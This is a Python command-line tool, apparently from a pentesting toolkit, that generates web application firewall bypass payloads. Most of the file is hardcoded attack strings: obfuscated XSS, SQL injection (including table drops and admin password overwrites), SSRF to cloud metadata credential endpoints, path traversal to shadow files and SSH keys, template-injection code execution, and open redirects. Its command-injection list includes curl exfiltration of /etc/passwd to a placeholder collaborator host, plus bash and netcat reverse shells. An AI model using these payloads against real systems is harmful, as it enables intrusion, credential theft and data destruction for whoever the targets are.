#!/usr/bin/env python3
"""
WAF Bypass Payload Generator
Generate obfuscated payloads untuk bypass Web Application Firewalls

Usage: python3 waf_bypass_generator.py --type xss --output payloads.txt
"""

import argparse
import base64
import os
import random
import string
import sys
from urllib.parse import quote, quote_plus

# Add parent directory to path for imports
SCRIPTS_DIR = os.path.dirname(os.path.abspath(__file__))
SKILL_DIR = os.path.dirname(SCRIPTS_DIR)


class WAFBypassGenerator:
    def __init__(self):
        self.payloads = []

    def random_case(self, text):
        """Random case toggling"""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in text)

    def insert_comments(self, text, keyword):
        """Insert SQL comments"""
        return keyword.join([text[i:i+3] for i in range(0, len(text), 3)])

    def url_encode(self, text):
        """URL encode"""
        return quote(text)

    def double_url_encode(self, text):
        """Double URL encode"""
        return quote(quote(text))

    def html_entities(self, text):
        """Convert to HTML entities"""
        return ''.join(f'&#{ord(c)};' for c in text)

    def hex_encode(self, text):
        """Hex encode"""
        return ''.join(f'\\x{ord(c):02x}' for c in text)

    def unicode_encode(self, text):
        """Unicode encode"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)

    def base64_encode(self, text):
        """Base64 encode"""
        return base64.b64encode(text.encode()).decode()

    def null_byte_insert(self, text):
        """Insert null bytes"""
        return text.replace(' ', '%00')

    def whitespace_substitution(self, text):
        """Substitute whitespace"""
        subs = ['%09', '%0a', '%0d', '%0b', '%0c', '/**/']
        return text.replace(' ', random.choice(subs))

    def comment_injection(self, text):
        """Inject SQL comments"""
        return text.replace(' ', '/**/')

    # ============================================================
    # XSS PAYLOADS
    # ============================================================
    def generate_xss_payloads(self, context="html"):
        """Generate XSS payloads with WAF bypass"""
        base_payloads = [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert(document.domain)>',
            '<body onload=alert(document.domain)>',
            '<details open ontoggle=alert(document.domain)>',
            '<input onfocus=alert(document.domain) autofocus>',
            '<video src=x onerror=alert(document.domain)>',
            '<marquee onstart=alert(document.domain)>',
        ]

        bypass_payloads = []

        for payload in base_payloads:
            # Original
            bypass_payloads.append(payload)

            # Case toggling
            bypass_payloads.append(self.random_case(payload))

            # Null byte insertion
            bypass_payloads.append(payload.replace('<', '<%00'))

            # HTML entities
            bypass_payloads.append(self.html_entities(payload))

            # URL encoding
            bypass_payloads.append(self.url_encode(payload))

            # Double URL encoding
            bypass_payloads.append(self.double_url_encode(payload))

            # Unicode encoding
            bypass_payloads.append(self.unicode_encode(payload))

            # Hex encoding
            bypass_payloads.append(self.hex_encode(payload))

        # Additional WAF bypass techniques
        additional = [
            # SVG variations
            '<svg/onload=alert(document.domain)>',
            '<svg onload=alert(document.domain)//',
            '<svg/onload=alert(String.fromCharCode(88,83,83))>',
            '<svg onload=alert&#40;document.domain&#41;>',

            # Event handler variations
            '<img src=x onerror=alert`document.domain`>',
            '<img src=x onerror=alert&#0000040;document.domain)>',
            '<details open ontoggle=alert(document.domain)>',
            '<marquee onstart=alert(document.domain)>',

            # JavaScript protocol
            'javascript:alert(document.domain)',
            'JaVaScRiPt:alert(document.domain)',
            'java\x00script:alert(document.domain)',

            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
            "';alert(document.domain)//",
            '";alert(document.domain)//',
            '</script><script>alert(document.domain)</script>',

            # Attribute context
            '" onfocus=alert(document.domain) autofocus="',
            "' onfocus=alert(document.domain) autofocus='",
            '"><script>alert(document.domain)</script>',
            "'-alert(document.domain)-'",
            '"-alert(document.domain)-"',

            # Filter bypass
            '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
            '<SCRIPT>alert(document.domain)</SCRIPT>',
            '<ScRiPt>alert(document.domain)</ScRiPt>',
            '<scr%00ipt>alert(document.domain)</scri%00pt>',

            # Encoding bypass
            '%3Cscript%3Ealert(document.domain)%3C/script%3E',
            '%253Cscript%253Ealert(document.domain)%253C/script%253E',
            '&#x3C;script&#x3E;alert(document.domain)&#x3C;/script&#x3E',
            '&#60;script&#62;alert(document.domain)&#60;/script&#62',

            # Template literals
            '<img src=x onerror=alert`1`>',
            '<img src=x onerror=alert`${document.domain}`>',

            # eval() bypass
            '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
            '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))>',

            # DOM-based
            '#<script>alert(document.domain)</script>',
            'javascript:alert(document.domain)//',
            'data:text/html,<script>alert(document.domain)</script>',
        ]

        bypass_payloads.extend(additional)

        # Context-specific payloads
        if context == "attribute":
            bypass_payloads.extend([
                '" onmouseover="alert(document.domain)"',
                "' onmouseover='alert(document.domain)'",
                '" onfocus="alert(document.domain)" autofocus="',
                "' onfocus='alert(document.domain)' autofocus='",
                '" onclick="alert(document.domain)"',
                "' onclick='alert(document.domain)'",
            ])
        elif context == "javascript":
            bypass_payloads.extend([
                "'-alert(document.domain)-'",
                '"-alert(document.domain)-"',
                '</script><script>alert(document.domain)</script>',
                '/*</script><script>alert(document.domain)//*/',
            ])

        self.payloads.extend(bypass_payloads)
        return bypass_payloads

    # ============================================================
    # SQLi PAYLOADS
    # ============================================================
    def generate_sqli_payloads(self, context="generic"):
        """Generate SQLi payloads with WAF bypass"""
        base_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "' AND SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; SELECT * FROM users--",
        ]

        bypass_payloads = []

        for payload in base_payloads:
            # Original
            bypass_payloads.append(payload)

            # Case toggling
            bypass_payloads.append(self.random_case(payload))

            # Comment injection
            bypass_payloads.append(self.comment_injection(payload))

            # Whitespace substitution
            bypass_payloads.append(self.whitespace_substitution(payload))

            # URL encoding
            bypass_payloads.append(self.url_encode(payload))

            # Double URL encoding
            bypass_payloads.append(self.double_url_encode(payload))

        # Additional WAF bypass techniques
        additional = [
            # MySQL version comments
            "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
            "' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--",
            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",

            # Whitespace alternatives
            "' UNION%09SELECT%09NULL--",
            "' UNION%0aSELECT%0aNULL--",
            "' UNION%0dSELECT%0dNULL--",
            "' UNION%0bSELECT%0bNULL--",
            "' UNION%0cSELECT%0cNULL--",

            # Comment variations
            "' uni/**/on sel/**/ect NULL--",
            "' UN/**/ION SEL/**/ECT NULL--",
            "' UNION/**/SELECT/**/NULL--",

            # OR bypass
            "' OR/**/1=1--",
            "' OR%091=1--",
            "' OR%0a1=1--",
            "' OR%0d1=1--",
            "' || 1=1--",
            "' | 1=1--",
            "' OR 1=1 LIMIT 1--",

            # BETWEEN bypass
            "' AND 1 BETWEEN 0 AND 1--",
            "' AND 1 NOT BETWEEN 0 AND 0--",

            # LIKE bypass
            "' OR '1' LIKE '1",
            "' OR '1' LIKE '1'--",

            # IN bypass
            "' OR 1 IN (1)--",
            "' OR '1' IN ('1')--",

            # MySQL specific
            "' AND 1=1 ORDER BY 1--",
            "' AND 1=1 ORDER BY 10--",
            "' AND 1=1 GROUP BY 1--",
            "' AND 1=1 HAVING 1=1--",

            # Blind SQLi
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND LENGTH(database())>0--",

            # Time-based
            "' AND SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--",

            # NoSQL
            '{"$gt":""}',
            '{"$ne":""}',
            '{"$gt":"","$gt":""}',
            '{"username":{"$gt":""},"password":{"$gt":""}}',
            "true, $where: '1 == 1'",
            "', $or: [ {}, { 'a': 'a' } ], $comment: '",

            # JSON-based
            '{"username":"admin","password":{"$gt":""}}',
            '{"username":"admin","password":{"$ne":""}}',
            '{"$where":"1==1"}',
            '{"$where":"this.password.match(/.*/)"}',

            # Stacked queries
            "'; SELECT * FROM users--",
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('admin','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",

            # Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

            # UNION-based with different column counts
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT 1,2,3,4,5,6,7--",
            "' UNION SELECT 1,2,3,4,5,6,7,8--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",

            # Authentication bypass
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin' or '1'='1'/*",
            "admin') or ('1'='1",
            "admin') or ('1'='1'--",
        ]

        bypass_payloads.extend(additional)

        self.payloads.extend(bypass_payloads)
        return bypass_payloads

    # ============================================================
    # SSRF PAYLOADS
    # ============================================================
    def generate_ssrf_payloads(self):
        """Generate SSRF payloads"""
        payloads = [
            # Internal
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://0177.0.0.1',
            'http://2130706433',
            'http://0x7f000001',
            'http://127.1',

            # AWS
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://instance-data/latest/meta-data/',
            'http://instance-data/latest/user-data/',

            # GCP
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',

            # Azure
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json',

            # DigitalOcean
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/hostname',
            'http://169.254.169.254/metadata/v1/region',

            # Kubernetes
            'https://kubernetes.default.svc',
            'https://kubernetes.default.svc/api/v1/namespaces',
            'https://kubernetes.default.svc/api/v1/secrets',

            # Docker
            'http://localhost:2375/containers/json',
            'http://localhost:2376/containers/json',

            # Redis
            'http://localhost:6379/',
            'http://localhost:6379/INFO',

            # Memcached
            'http://localhost:11211/',

            # MySQL
            'http://localhost:3306/',

            # PostgreSQL
            'http://localhost:5432/',

            # MongoDB
            'http://localhost:27017/',

            # Elasticsearch
            'http://localhost:9200/',
            'http://localhost:9200/_cat/indices',

            # URL tricks
            'http://127.0.0.1@evil.com',
            'http://evil.com#@127.0.0.1',
            'http://127.0.0.1%23@evil.com',
            'http://127.0.0.1:80%25@evil.com',
            'http://127.0.0.1:80\\@evil.com',

            # Protocols
            'file:///etc/passwd',
            'file:///etc/hostname',
            'file:///proc/self/environ',
            'file:///proc/self/cmdline',
            'gopher://127.0.0.1:25/_HELO%20localhost',
            'gopher://127.0.0.1:6379/_INFO',
            'dict://127.0.0.1:6379/INFO',
            'ftp://127.0.0.1/',
            'tftp://127.0.0.1/',
            'ldap://127.0.0.1/',

            # DNS rebinding
            'http://rbndr.us',
            'http://ssrf.xip.io',
            'http://nip.io',

            # IPv6
            'http://[::1]:80/',
            'http://[0:0:0:0:0:0:0:1]:80/',
            'http://[::ffff:127.0.0.1]:80/',
        ]

        self.payloads.extend(payloads)
        return payloads

    # ============================================================
    # LFI PAYLOADS
    # ============================================================
    def generate_lfi_payloads(self):
        """Generate LFI payloads"""
        payloads = [
            # Linux
            '../../../../../../etc/passwd',
            '../../../../../../etc/shadow',
            '../../../../../../etc/hosts',
            '../../../../../../etc/hostname',
            '../../../../../../proc/self/environ',
            '../../../../../../proc/self/cmdline',
            '../../../../../../proc/version',
            '../../../../../../var/log/apache2/access.log',
            '../../../../../../var/log/nginx/access.log',
            '../../../../../../var/log/auth.log',
            '../../../../../../var/log/syslog',
            '../../../../../../home/*/.ssh/id_rsa',
            '../../../../../../home/*/.bash_history',
            '../../../../../../root/.ssh/id_rsa',
            '../../../../../../root/.bash_history',

            # Windows
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\boot.ini',
            '..\\..\\..\\..\\..\\..\\inetpub\\wwwroot\\web.config',
            'C:\\windows\\win.ini',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\boot.ini',

            # Path traversal bypass
            '....//....//....//etc/passwd',
            '....//....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            '..%252f..%252f..%252fetc/passwd',
            '....\\/....\\/....\\/etc/passwd',
            '....\\\\....\\\\....\\\\etc\\\\passwd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%c1%9c..%c1%9c..%c1%9cetc/passwd',
            '/etc/passwd%00',
            '/etc/passwd%00.html',
            '/etc/passwd%00.jpg',
            '../../../../etc/passwd%00.html',
            '../../../../etc/passwd%00.jpg',

            # PHP wrappers
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=config.php',
            'php://filter/convert.base64-encode/resource=../config.php',
            'php://filter/convert.base64-encode/resource=../../config.php',
            'php://filter/convert.base64-encode/resource=../../../etc/passwd',
            'php://input',
            'php://filter/convert.base64-encode/resource=php://input',
            'data://text/plain,<?php echo shell_exec("id"); ?>',
            'data://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJpZCIpOyA/Pg==',
            'expect://id',
            'expect://ls',
            'zip://shell.jpg%23shell.php',
            'phar://shell.jpg/shell.php',

            # Log poisoning
            '../../../../../../var/log/apache2/access.log',
            '../../../../../../var/log/apache2/error.log',
            '../../../../../../var/log/nginx/access.log',
            '../../../../../../var/log/nginx/error.log',
            '../../../../../../var/log/httpd/access_log',
            '../../../../../../var/log/httpd/error_log',
            '../../../../../../var/log/nginx/error.log',
        ]

        self.payloads.extend(payloads)
        return payloads

    # ============================================================
    # COMMAND INJECTION PAYLOADS
    # ============================================================
    def generate_cmdi_payloads(self):
        """Generate Command Injection payloads"""
        payloads = [
            # Basic
            '; id',
            '| id',
            '|| id',
            '& id',
            '&& id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '|| cat /etc/passwd',
            '& cat /etc/passwd',
            '&& cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',

            # Bypass filters
            "c'a't /etc/passwd",
            'c"a"t /etc/passwd',
            'cat /etc/pas??d',
            'cat /etc/pass*',
            '/bin/ca? /etc/passwd',
            '${PATH:0:1}bin${PATH:0:1}cat /etc/passwd',
            '${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}cat /etc/passwd',
            'w`echo h`o`echo am`i',
            'who`echo ami`',
            'wh$(echo o)ami',
            'w$@hoami',
            '/usr/bin/id',
            '/bin/id',
            'id;',
            'id|',
            'id&',
            'id&&',
            'id||',
            'id`',
            'id$()',

            # Time-based
            '; sleep 5',
            '| sleep 5',
            '|| sleep 5',
            '& sleep 5',
            '&& sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; sleep$IFS$5',
            '| sleep$IFS$5',
            '; sleep${IFS}5',
            '| sleep${IFS}5',
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1',
            '; ping -n 5 127.0.0.1',
            '| ping -n 5 127.0.0.1',

            # Out-of-band
            '; nslookup YOUR_DOMAIN',
            '| nslookup YOUR_DOMAIN',
            '&& nslookup YOUR_DOMAIN',
            '`nslookup YOUR_DOMAIN`',
            '$(nslookup YOUR_DOMAIN)',
            '; curl http://YOUR_COLLABORATOR',
            '| curl http://YOUR_COLLABORATOR',
            '&& curl http://YOUR_COLLABORATOR',
            '; wget http://YOUR_COLLABORATOR',
            '| wget http://YOUR_COLLABORATOR',
            '&& wget http://YOUR_COLLABORATOR',
            '; dig YOUR_DOMAIN',
            '| dig YOUR_DOMAIN',

            # Data exfiltration
            '; cat /etc/passwd | curl -X POST -d @- http://YOUR_COLLABORATOR',
            '| cat /etc/passwd | curl -X POST -d @- http://YOUR_COLLABORATOR',
            '; curl http://YOUR_COLLABORATOR/$(cat /etc/passwd | base64)',
            '| curl http://YOUR_COLLABORATOR/$(cat /etc/passwd | base64)',

            # Reverse shell
            '; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1',
            '| bash -i >& /dev/tcp/YOUR_IP/4444 0>&1',
            '; nc -e /bin/bash YOUR_IP 4444',
            '| nc -e /bin/bash YOUR_IP 4444',

            # Windows
            '; dir',
            '| dir',
            '& dir',
            '&& dir',
            '; type C:\\windows\\win.ini',
            '| type C:\\windows\\win.ini',
            '; whoami',
            '| whoami',
            '& whoami',
            '&& whoami',
            '; systeminfo',
            '| systeminfo',
            '; ipconfig',
            '| ipconfig',
            '; net user',
            '| net user',
            '| ping -n 5 127.0.0.1',
            '; ping -n 5 127.0.0.1',

            # Environment variable bypass
            '${IFS}',
            '$IFS',
            '${PATH:0:1}',
            '${HOME:0:1}',
            '${USER:0:1}',
            '$(($RANDOM%10))',

            # Newline injection
            '%0a id',
            '%0d%0a id',
            '%0a cat /etc/passwd',
            '%0d%0a cat /etc/passwd',
        ]

        self.payloads.extend(payloads)
        return payloads

    # ============================================================
    # SSTI PAYLOADS
    # ============================================================
    def generate_ssti_payloads(self):
        """Generate SSTI payloads"""
        payloads = [
            # Detection
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '{{=7*7}}',
            "{{7*'7'}}",
            '{{7+7}}',
            '{{7-7}}',
            '{{7/7}}',
            '{{7%7}}',
            '{{7^7}}',
            '{{7&7}}',
            '{{7|7}}',
            '{{7<<1}}',
            '{{7>>1}}',

            # Jinja2
            '{{config.items()}}',
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",

            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            "{{_self.env.enableDebug()}}{{_self.env.dump(1)}}",
            "{{['id']|filter('system')}}",
            "{{['cat /etc/passwd']|filter('system')}}",

            # Freemarker
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("cat /etc/passwd")}',
            '<#assign dc="freemarker.template.utility.ObjectConstructor"?new()>${ dc("java.lang.ProcessBuilder","id").start()}',

            # Mako
            '<%\nimport os\nx=os.popen("id").read()\n%>\n${x}',
            '<%\nimport os\nx=os.popen("cat /etc/passwd").read()\n%>\n${x}',
            '${self.module.cache.util.os.popen("id").read()}',

            # ERB
            '<%= `id` %>',
            '<%= system("id") %>',
            '<%= IO.popen("id").readlines() %>',
            '<%= `cat /etc/passwd` %>',
            '<%= system("cat /etc/passwd") %>',
            '<%= IO.popen("cat /etc/passwd").readlines() %>',

            # Handlebars
            "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",

            # Pebble
            '{{=7*7}}',
            '{{ variable | default("id") }}',

            # Velocity (Java)
            '#set($exec=$Runtime.getRuntime().exec("id"))',
            '#set($exec=$Runtime.getRuntime().exec("cat /etc/passwd"))',
            '$Runtime.getRuntime().exec("id")',
            '$Runtime.getRuntime().exec("cat /etc/passwd")',

            # Smarty (PHP)
            '{system("id")}',
            '{system("cat /etc/passwd")}',
            '{php}system("id");{/php}',
            '{php}system("cat /etc/passwd");{/php}',

            # Jade/Pug
            '#{7*7}',
            '#{process.mainModule.require("child_process").execSync("id")}',

            # Slim
            '#{7*7}',
            '#{`id`}',
            '#{system("id")}',

            # Go templates
            '{{.}}',
            '{{printf "%s" "id"}}',
            '{{template "id"}}',

            # Pug (Node.js)
            '#{function(){return require("child_process").execSync("id")}()}',

            # WAF bypass
            '{{7*7}}',
            '{{ 7*7 }}',
            '{{  7*7  }}',
            '{{ 7 * 7 }}',
            '{{ 7  *  7 }}',
        ]

        self.payloads.extend(payloads)
        return payloads

    # ============================================================
    # OPEN REDIRECT PAYLOADS
    # ============================================================
    def generate_open_redirect_payloads(self):
        """Generate Open Redirect payloads"""
        payloads = [
            'https://evil.com',
            '//evil.com',
            '///evil.com',
            '////evil.com',
            '/////evil.com',
            'https://target.com@evil.com',
            'https://evil.com#@target.com',
            'https://evil.com%23@target.com',
            'https://evil.com%00.target.com',
            'https://target.com.evil.com',
            'https://target.com\\.evil.com',
            'https://target.com%00.evil.com',
            'https://target.com%09.evil.com',
            'https://target.com%0a.evil.com',
            'https://target.com%0d.evil.com',
            '/\\evil.com',
            '//evil.com/%2f..',
            '///evil.com/..',
            '////evil.com/..',
            'https://evil.com/https://target.com',
            'https://evil.com%2f%2ftarget.com',
            'https://evil.com%5ctarget.com',
            'https://evil.com%00target.com',
            'https://evil.com%09target.com',
            'https://evil.com%0atarget.com',
            'https://evil.com%0dtarget.com',
            'javascript:alert(document.domain)',
            'data:text/html,<script>alert(document.domain)</script>',
            'vbscript:MsgBox("XSS")',
            'https://evil.com%23%40target.com',
            'https://evil.com%2523%2540target.com',
            '//evil.com/%2e%2e',
            '//evil.com/..%2f',
            '//evil.com/%2e%2e%2f',
            '//evil.com/%2e%2e/',
            '///evil.com/%2e%2e',
            '///evil.com/..%2f',
            '///evil.com/%2e%2e%2f',
            '///evil.com/%2e%2e/',
            '////evil.com/%2e%2e',
            '////evil.com/..%2f',
            '////evil.com/%2e%2e%2f',
            '////evil.com/%2e%2e/',
        ]

        self.payloads.extend(payloads)
        return payloads

    # ============================================================
    # UTILITY METHODS
    # ============================================================
    def save_payloads(self, output_file):
        """Save payloads to file"""
        with open(output_file, 'w') as f:
            for payload in self.payloads:
                f.write(payload + '\n')
        print(f"[+] Saved {len(self.payloads)} payloads to {output_file}")

    def get_payloads(self):
        """Get all payloads"""
        return self.payloads


def main():
    parser = argparse.ArgumentParser(description='WAF Bypass Payload Generator')
    parser.add_argument('--type', '-t', required=True,
                       choices=['xss', 'sqli', 'ssrf', 'lfi', 'cmdi', 'ssti', 'open_redirect', 'all'],
                       help='Payload type to generate')
    parser.add_argument('--context', '-c', default='html',
                       choices=['html', 'attribute', 'javascript', 'generic', 'union', 'error_based',
                               'time_blind', 'boolean_blind', 'internal', 'cloud_metadata', 'protocols',
                               'bypass', 'linux', 'windows'],
                       help='Payload context (default: html)')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--waf-bypass', '-w', action='store_true', help='Generate WAF bypass payloads')

    args = parser.parse_args()

    generator = WAFBypassGenerator()

    if args.type == 'xss':
        payloads = generator.generate_xss_payloads(args.context)
    elif args.type == 'sqli':
        payloads = generator.generate_sqli_payloads(args.context)
    elif args.type == 'ssrf':
        payloads = generator.generate_ssrf_payloads()
    elif args.type == 'lfi':
        payloads = generator.generate_lfi_payloads()
    elif args.type == 'cmdi':
        payloads = generator.generate_cmdi_payloads()
    elif args.type == 'ssti':
        payloads = generator.generate_ssti_payloads()
    elif args.type == 'open_redirect':
        payloads = generator.generate_open_redirect_payloads()
    elif args.type == 'all':
        generator.generate_xss_payloads()
        generator.generate_sqli_payloads()
        generator.generate_ssrf_payloads()
        generator.generate_lfi_payloads()
        generator.generate_cmdi_payloads()
        generator.generate_ssti_payloads()
        generator.generate_open_redirect_payloads()

    if args.output:
        generator.save_payloads(args.output)
    else:
        print(f"\n[+] Generated {len(generator.get_payloads())} payloads:\n")
        for i, payload in enumerate(generator.get_payloads()[:50], 1):
            print(f"{i:3}. {payload}")
        if len(generator.get_payloads()) > 50:
            print(f"\n... and {len(generator.get_payloads()) - 50} more payloads")


if __name__ == '__main__':
    main()
